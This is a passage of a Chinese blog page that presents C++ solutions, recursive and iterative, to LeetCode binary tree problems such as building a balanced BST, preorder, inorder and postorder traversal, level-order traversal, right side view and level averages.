class="title">preorderTraversal</span><span class="params">(TreeNode* root, vector&lt;TreeNode*&gt; &amp;l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            l.<span class="built_in">push_back</span>(root);</span><br><span class="line">            <span class="built_in">preorderTraversal</span>(root-&gt;left, l);</span><br><span class="line">            <span class="built_in">preorderTraversal</span>(root-&gt;right, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="108-将有序数组转换为二叉搜索树——同【最小高度树】"><a href="#108-将有序数组转换为二叉搜索树——同【最小高度树】" class="headerlink" title="108 将有序数组转换为二叉搜索树——同【最小高度树】"></a>108 将有序数组转换为二叉搜索树——同【最小高度树】</h3><p>给你一个整数数组 nums ，其中元素已经按 <strong>升序</strong> 排列（可以确保数组是二叉搜索树的中序遍历序列），请你将其转换为一棵 <strong>高度平衡</strong> <strong>二叉搜索树</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Create</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">Create</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);<span class="comment">//新建结点</span></span><br><span class="line">        root-&gt;left = <span class="built_in">Create</span>(nums,left,mid<span class="number">-1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">Create</span>(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="144-二叉树的【前序】遍历——【根左右】"><a href="#144-二叉树的【前序】遍历——【根左右】" class="headerlink" title="144 二叉树的【前序】遍历——【根左右】"></a>144 二叉树的【前序】遍历——【根左右】</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;TreeNode*&gt; stk;</span><br><span class="line">        TreeNode* node = root;</span><br><span class="line">        <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() || node != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (node != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(node-&gt;val);<span class="comment">//根</span></span><br><span class="line">                stk.<span class="built_in">emplace</span>(node);</span><br><span class="line">                node = node-&gt;left;<span class="comment">//左</span></span><br><span class="line">            &#125;</span><br><span class="line">            node = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            node = node-&gt;right;<span class="comment">//右</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>(); <span class="comment">// 根</span></span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;right);<span class="comment">//右</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;left);<span class="comment">//左</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="145-二叉树的【后序】遍历【左右根】"><a href="#145-二叉树的【后序】遍历【左右根】" class="headerlink" title="145 二叉树的【后序】遍历【左右根】"></a>145 二叉树的【后序】遍历【左右根】</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">postorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">postorder</span>(root-&gt;right,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">postorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;left); <span class="comment">//左</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;right); <span class="comment">//右</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>()); <span class="comment">//结果反转之后就是左右中的顺序了</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="94-二叉树的【中序】遍历——【左根右】"><a href="#94-二叉树的【中序】遍历——【左根右】" class="headerlink" title="94 二叉树的【中序】遍历——【左根右】"></a>94 二叉树的【中序】遍历——【左根右】</h3><p>给定一个二叉树的根节点 root ，返回 它的 中序 遍历 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode* root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">inorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;</span><br><span class="line">        <span class="keyword">while</span> (cur!=<span class="literal">NULL</span> || !st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(cur); </span><br><span class="line">                cur = cur-&gt;left;<span class="comment">//左</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = st.<span class="built_in">top</span>(); <span class="comment">//从栈里弹出的数据，就是要处理的数据（放进result数组里的数据）</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                result.<span class="built_in">push_back</span>(cur-&gt;val);<span class="comment">//中</span></span><br><span class="line">                cur = cur-&gt;right;<span class="comment">//右</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="102-二叉树的【层序】遍历——【队列】"><a href="#102-二叉树的【层序】遍历——【队列】" class="headerlink" title="102 二叉树的【层序】遍历——【队列】"></a>102 二叉树的【层序】遍历——【队列】</h3><p><strong>图中的广度优先遍历——二叉树的层序遍历——队列</strong><br><img src="https://img-blog.csdnimg.cn/d19a780b3fd444c5b3f4d5f5ef035610.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">order</span><span class="params">(TreeNode* cur, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; result, <span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (result.<span class="built_in">size</span>() == depth) </span><br><span class="line">            result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;());</span><br><span class="line">        result[depth].<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="built_in">order</span>(cur-&gt;left, result, depth + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">order</span>(cur-&gt;right, result, depth + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">order</span>(root, result, depth);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//迭代-队列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//每层结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="comment">// 这里一定要使用固定大小size，不要使用que.size()，因为que.size是不断变化的</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;<span class="comment">//遍历每层</span></span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="comment">//每遍历一个结点，将其左右子树入队</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(vec);<span class="comment">//将一层结点装入 res中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="107-二叉树的层序遍历-II"><a href="#107-二叉树的层序遍历-II" class="headerlink" title="107 二叉树的层序遍历 II"></a>107 二叉树的层序遍历 II</h3><p><img src="https://img-blog.csdnimg.cn/a19d8a1862c942d2af5348cd81fa5e6f.png"><br>反转上一题的结果即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>()); <span class="comment">//在这里反转一下数组即可</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199 二叉树的右视图"></a>199 二叉树的右视图</h3><p>给定一个二叉树的 根节点 root，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。<br><img src="https://img-blog.csdnimg.cn/b6a1b6fb43b54267a1231af84c6bd586.png"><br>层序遍历的时候，判断是否遍历到<strong>单层的最后面的元素</strong>，如果是，就放进result数组中，随后返回result就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightSideView</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (i == (size<span class="number">-1</span>))<span class="comment">//处理单层最后一个元素</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="637-二叉树的层平均值"><a href="#637-二叉树的层平均值" class="headerlink" title="637 二叉树的层平均值"></a>637 二叉树的层平均值</h3><p>给定一个非空二叉树的根节点 root , 以数组的形式返回每一层节点的平均值。与实际答案相差 10-5 以内的答案可以被接受。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">double</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">double</span> sum = <span class="number">0</span>;<span class="comment">//记录 每层的 和sum</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                sum += node-&gt;val;<span class="comment">//sum</span></span><br><span class="line">                <span class="keyword">if</span> (i == (size<span class="number">-1</span>))<span class="comment">//最后时，求平均值装入</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(sum/size);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span 